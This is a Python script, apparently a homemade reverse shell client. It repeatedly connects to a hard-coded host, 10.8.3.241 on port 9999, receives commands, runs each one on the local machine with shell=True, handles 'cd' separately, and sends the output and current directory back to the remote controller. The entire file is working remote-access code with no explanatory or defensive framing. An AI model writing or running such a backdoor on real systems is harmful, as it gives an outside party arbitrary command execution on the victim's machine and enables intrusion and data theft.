import socket
import os
import time
import subprocess

def socket_start():
    try:
        handle_socket()
    except socket.error as msg:
        print("Trying to connect to the server..." +str(msg))
        time.sleep(5)
        socket_start()

def handle_socket():
    while True:
        s = socket.socket()
        host = '10.8.3.241'
        port = 9999
        s.connect((host,port))
        
        data = s.recv(4064)

        if(data[:2].decode("utf-8") == "cd"):
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if len(data)>0:
            print("Ejecutando comando : "+str(data[:].decode("utf-8")))
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            try:
                output_str = str(output_bytes,encoding="utf-8")
            except:
                print("Exception \n")
                output_str = str(output_bytes)
                output_str = output_str.replace("\\n","\n")
                output_str = output_str.replace("\\r","\r")
                output_str = output_str.replace("\\t","\t")
                output_str = output_str.replace("\\xa3","\xa3")
                
                #output_str = str(output_str,encoding="utf-8")

            s.send(str.encode(output_str+str(os.getcwd())+'> '))
            print(output_str)
socket_start()

